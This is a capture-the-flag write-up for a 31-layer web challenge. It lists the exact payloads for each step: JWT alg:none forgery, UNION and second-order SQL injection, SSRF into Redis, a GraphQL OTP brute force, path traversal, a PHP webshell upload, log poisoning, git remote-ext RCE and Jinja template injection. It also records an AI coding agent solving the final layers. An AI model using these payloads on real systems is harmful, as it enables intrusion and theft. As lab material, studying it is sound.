# Velora

> Web · Not shown · evil l0rd  
> Points: 898 · Flag submitted by: secretNinja
> Contributors: [JohnG4lt](https://github.com/j0hn-G4lt) — full end-to-end solver (`9125-velora-solve.py`) and writeup (`9125-velora-john-writeup.md`)  

**The flag**

`CSCTF{3spBuSbEmVF3aq8H7DigViR2}` — returned by the Layer 31 navigator query as the `settlement_record`.

**Tools used**

Python `requests` scripts for the layer chain, driven as a replay script so the layers fired in order on
a fresh instance. The final navigator-injection gates (layers 30–31) were cracked by Codex (gpt-daybreak,
run directly under human steering) after our earlier request-lifecycle and parser theories turned out to be
dead ends; Codex also submitted the accepted flag through the guarded helper. JohnG4lt independently built a single self-contained `urllib` solver that drives the whole chain; it ships here as `9125-velora-solve.py`.

**Approach**

There were no handout files; everything starts from the landing page of the assigned instance. Velora is a
31-layer chain. Each layer is unlocked by a concrete exploit step; you then `GET /x/<id>`, replaying every
earlier layer's proof in the `X-Chain` header (joined with `|`), and the response mints a new proof
(`{"ok":true,"proof":...,"next":"/x/<id>"}`) and names the next layer. From layer 4 on, the server also
checks that the step actually fired, so the layers must be driven in order. We scripted the whole chain
(`replay_chain.py`, then `replay_21_29.py`) so it could be rebuilt on a fresh instance; the state (session
cookie, accumulated proofs, next gate) is carried in `live_state.json` between stages.

The full walk, from the first request to the flag. The action in each bullet is taken *before* that layer's
`/x/N` visit, and every `/x/N` visit carries `X-Chain:` = all prior proofs joined with `|`.

- **Session setup** — before any layer, create a session:
  `POST /signup` with `name`, a throwaway `email`, a password, and the two trust flaws mass-assigned:
  `plan=enterprise` and `memberId=7c2a9e14-6b38-4d1f-9a55-2e8f0b6c1d47` (the member UUID the client
  exposes). The client lets you pick your own plan and member id, and the server trusts both.
- **L1** — `GET /` and pull the first gate from the HTML (`channel:/x/<id>`).
- **L2** — `GET /robots.txt`; a comment there gives the second gate (`budget:/x/<id>`).
- **L3** — `GET /static/app.js`; its source map reference gives the third gate (`map:/x/<id>`).
  (These three entry points rotate per run, so read them fresh each time with a regex, not a constant.)
- **L4** — visit the three gates in order; each `/x/<id>` mints a proof, and layer 4 is where the server
  starts also checking that the previous step actually fired.
- **L5** — IDOR: `GET /api/members/7c2a9e14-6b38-4d1f-9a55-2e8f0b6c1d47/settings`, reading another member's
  settings using the id we assigned ourselves at signup.
- **L6** — `POST /login` with the design-review account exposed in the client bundle:
  `email=preview@velora.example`, `password=harbor-preview-19`.
- **L7** — forge the `velora_session` JWT to `alg:none`. The header is
  `{"alg":"none","typ":"JWT"}` and the claims are `{"iss":"velora","sub":"preview@velora.example",
  "name":"Design review","role":"admin"}`, base64url-encoded, with an empty signature segment (trailing
  `.`). Set it as the cookie. The verifier accepts an unsigned token, so `role:admin` is taken at face
  value.
- **L8** — `GET /api/v1/export/1001`, the legacy partner export, now reachable as admin.
- **L9** — SQLi in the catalog search. The query is a seven-column UNION onto `fabric_routes`:
  `GET /catalog?q=zzzz%' UNION SELECT 0,id,name,detail,'','',0 FROM fabric_routes -- ` (the `%'` closes the
  `LIKE`, the seven columns match the real `SELECT`, and `-- ` comments out the tail).
- **L10** — SSRF to the internal fabric:
  `GET /api/preview?url=http://fabric.velora.internal:80/` with header
  `X-Forwarded-Host: fabric.velora.internal`. The forwarded-host header is what convinces the preview
  fetcher the internal name is in scope.
- **L11** — repeat the same preview request; the host-override state set at L10 persists, which the gate
  checks for.
- **L12** — bypass the SSRF host allowlist with loopback written as a single 32-bit decimal:
  `GET /api/preview?url=http://2130706433:80/` (2130706433 = 127.0.0.1). The filter matched on the
  hostname string, not the resolved address.
- **L13** — reach the cache: `GET /api/preview?url=http://2130706433:6379/`; the banner confirms Redis.
- **L14** — enumerate keys through the preview's `dict://` handler:
  `GET /api/preview?url=dict://2130706433:6379/keys:*`.
- **L15** — read the operator session value:
  `GET /api/preview?url=dict://2130706433:6379/GET operator.session`; the `data` field is the cookie value.
- **L16** — set cookie `operator=<value from L15>`.
- **L17–L18** — `POST /api/graphql` with APQ (automatic persisted queries): send
  `{"query":"query { health }","extensions":{"persistedQuery":{"version":1,"sha256Hash":<sha256(query)>}}}`,
  then the same shape for `{ accounts { holder internalLedgerKey } }`, which lists the accounts and their
  ledger keys.
- **L19** — step-up bypass. One `POST /api/graphql` mutation with 100,000 aliased fields, i.e. every
  5-digit code in a single request via GraphQL aliasing:
  `mutation{ aaa:verifyOtp(code:"00000"){ok} aab:verifyOtp(code:"00001"){ok} … }` (unique 3-letter alias
  per code). The server evaluates all of them in one request, so one of the 100,000 matches the real OTP
  without any rate limit ever tripping.
- **L20** — `GET /dashboard`, which renders `views/dashboard-pages/home.html`.
- **L21** — LFI in the page loader:
  `GET /dashboard?page=dashboard-pages/../../secret/schema.txt`, disclosing the `config(name,value)`
  schema, the Apache access-log path and the entrypoint. This was the longest stall: we worked through
  many directory/filename layouts under the loader before `secret/` served the file.
- **L22** — `GET /library?doc=library/../../../../../etc/apache2/mods-enabled/php.conf`, the PHP handler
  map, confirming that any filename *containing* `.php` is handed to the PHP interpreter
  (`application/x-httpd-php`).
- **L23** — upload a PHP webshell as `sh.php.png` with `Content-Type: image/png` via `POST /support`
  (body `<?php system($_GET["c"]); ?>`), then execute with `GET /uploads/sh.php.png?c=<cmd>`. Because the
  stored name still contains `.php`, the handler map from L22 runs it despite the `.png` tail;
  `?c=id` returns `uid=33(www-data)`.
- **L24** — log poisoning for a second shell: send a PHP payload in `User-Agent`
  (`<?php system($_GET["c"]); ?>`) on a plain `GET /`, then LFI the raw log through the loader:
  `GET /dashboard?page=dashboard-pages/../../../../../var/log/apache2/access.log&c=<cmd>`.
- **L25–L26** — read `/entrypoint.sh` (gives `RECON_USER=svc.settle`) and `/opt/velora/reconcile.env`
  (gives `RECON_PASS`) through those shells.
- **L27** — Git `remote-ext` RCE on the authenticated import desk (HTTP basic with the recovered
  `svc.settle` credentials): `POST /import` with
  `repo_url=ext::sh -c cat${IFS}/opt/velora/nightly.sh>&2`, which prints the nightly job and reveals that
  it calls `http://…/ledger/reconcile`.
- **L28** — SSTI in the demo form: `POST /request-demo` with
  `name={{ cycler.__init__.__globals__.os.popen('cat /root/velora/release.note').read() }}`; the release
  note reveals the navigator SQL query (`… FROM nav WHERE role='<role>' ORDER BY sort`).
- **L29** — SSRF with basic auth to the settlement worker:
  `GET /api/preview?url=http://svc.settle:<RECON_PASS>@2130706433:9200/ledger/reconcile`; this runs the
  settlement job, which writes `settlement_record` into the `config` table.
- **L30** — forge the JWT `role` claim to `x' UNION SELECT '/delay',sleep(3) #`. The navigator query
  builds `… FROM nav WHERE role='<role>' ORDER BY sort`; the `#` comments out the appended `ORDER BY`,
  and the gate records the time-based delay, proving the second-order injection reaches the backend.
- **L31** — forge the `role` to `x' UNION SELECT value,value FROM config WHERE name='settlement_record' #`
  in the same `alg:none` JWT; the navigator gate returns the `settlement_record` the L29 job wrote — the
  flag, `CSCTF{3spBuSbEmVF3aq8H7DigViR2}`.

**The full solver**

The entire chain is scripted end to end in [`9125-velora-solve.py`](9125-velora-solve.py) (JohnG4lt), with his own walkthrough in [`9125-velora-john-writeup.md`](9125-velora-john-writeup.md). Run it against a fresh instance with `python3 9125-velora-solve.py http://<instance>`. It builds one authenticated session (the mass-assigned `plan` and `memberId` from signup), reads the three rotating entry gates from the landing page, `robots.txt` and the app bundle, then walks every gate in order while carrying the accumulated proofs in the `X-Chain` header. The run has three phases:

- **Layers 1-20 - account trust and internal services.** The self-assigned member IDOR, the `alg:none` admin token, the forwarded-host SSRF into the internal fabric, loopback-as-decimal to reach the cache through the preview `dict://` handler, and the persisted-query GraphQL reads up to the aliased one-request OTP step-up.
- **Layers 21-29 - file read and code execution.** The page-loader LFI, the PHP handler-map upload, the log-poisoning second shell, the recovered service credentials, the `remote-ext` import RCE, the demo-form SSTI, and the authenticated SSRF that runs the settlement job.
- **Layers 30-31 - the navigator-injection gates.** Both forged in the same `alg:none` token: a timing probe that confirms the second-order injection reaches the backend, then the extraction that returns the settlement record.

The script prints each layer's result as it goes and ends on the settlement record.

**Why it works**

Each layer is a separate, self-contained flaw, and the proofs only chain them together. The ones that
carried the chain were trust in client-controlled data (signup fields, `alg:none` tokens, forwarded-host
headers, role claims passed into SQL) and internal services that assume loopback means trusted (Redis, the
settlement API). The last two gates need the injection in the dialect the backend actually parses: a
MySQL-style `sleep()` with `#` as the terminator. SQLite-style recursive-CTE delays and `/*` or `--`
terminators did not pass.

**Validation / reproduction**

Layer 31 returned the settlement record in two forms, as the `config` row and as a `settlement_record`
field — the same value layer 29 had just written, in the `CSCTF{...}` frame. The late gates were the
stall: earlier runs treated layers 30–31 as a request-lifecycle or parser problem and got nowhere. Once
that was ruled out and the gate was driven with a direct `alg:none` JWT `role` carrying a MySQL `sleep(3)`
/ `#` UNION, the chain landed and the service returned the flag. The guarded submission returned `correct`.

Reproduction summary: run `replay_chain.py <instance>` to drive L1–L20 (it writes `live_state.json`), then
`replay_21_29.py` for L21–L29 (which performs the file-read/RCE/SSTI steps and the L29 settlement write),
then fire the L30 timing JWT once and the L31 extraction JWT. Gotchas: read L1–L3's rotating gate ids fresh
each run; keep the `X-Chain` header current (all prior proofs, `|`-joined) on every gate; the webshell
filename must contain `.php` for the handler map to execute it; and the L30/L31 injection must use MySQL
syntax (`sleep()`, `#`), not SQLite.

JohnG4lt's `9125-velora-solve.py` reproduces the whole chain against a fresh instance from a single file, and `9125-velora-john-writeup.md` is a second, independent walkthrough of the same solve.
